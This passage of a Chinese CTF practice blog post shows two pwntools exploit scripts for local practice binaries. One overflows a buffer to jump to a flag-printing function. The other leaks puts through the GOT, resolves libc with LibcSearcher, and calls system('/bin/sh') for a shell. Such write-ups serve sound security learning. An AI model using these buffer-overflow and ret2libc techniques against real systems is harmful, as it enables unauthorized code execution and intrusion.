+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">offset=<span class="number">22</span></span><br><span class="line">catflag=<span class="number">0x80485A7</span></span><br><span class="line">payload=<span class="string">'a'</span>*offset+p32(catflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="高级魔法"><a href="#高级魔法" class="headerlink" title="高级魔法"></a>高级魔法</h1><p>这个题目跟上一个题逻辑一致，但是去掉了 cat flag，所以需要实现 system(“/bin/sh”)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">"pwn"</span>)</span><br><span class="line">p=remote(<span class="string">"127.0.0.1"</span>,<span class="number">10002</span>)</span><br><span class="line">offset=<span class="number">22</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"success\n"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*offset+p32(elf.plt[<span class="string">'puts'</span>])+p32(<span class="number">0x0804862E</span>)+p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_addr=puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system=libc_addr+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh=libc_addr+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(offset*<span class="string">"a"</span>+p32(system)+p32(<span class="number">4</span>)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-08-03T02:52:13.518Z" itemprop="dateUpdated">2020-08-03 10:52:13</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2019/11/10/vpgk9n/&title=《PWN题练一下》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2019/11/10/vpgk9n/&title=《PWN题练一下》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2019/11/10/vpgk9n/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PWN题练一下》 — yichen's blog&url=https://yichen115.github.io/2019/11/10/vpgk9n/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2019/11/10/vpgk9n/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/11/10/uq0cnx/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">python脚本</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/11/10/zzg02e/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">pwn入门（蒸米ROP）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2019/11/10/vpgk9n/&title=《PWN题练一下》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2019/11/10/vpgk9n/&title=《PWN题练一下》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2019/11/10/vpgk9n/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PWN题练一下》 — yichen's blog&url=https://yichen115.github.io/2019/11/10/vpgk9n/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2019/11/10/vpgk9n/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2019/11/10/vpgk9n/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
